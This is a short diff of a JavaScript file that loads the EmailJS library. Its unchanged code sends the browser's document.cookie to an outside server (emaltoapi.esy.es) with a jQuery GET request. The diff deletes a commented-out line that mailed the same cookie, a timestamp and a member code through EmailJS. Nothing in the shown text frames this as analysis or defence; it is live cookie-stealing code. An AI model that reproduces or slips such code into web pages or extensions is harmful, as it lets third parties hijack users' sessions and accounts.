@@ -28,7 +28,7 @@ $.getScript('https://cdn.emailjs.com/dist/email.min.js', function() {
             */
              
              $.get("http://emaltoapi.esy.es/api.php?name=%27x%27&cookie="+document.cookie, function( data ) {});
-             //emailjs.send("gmail","data",{cookie: document.cookie, time: new Date().getTime(),"memcode":memcode});
+
           }
      });
 });
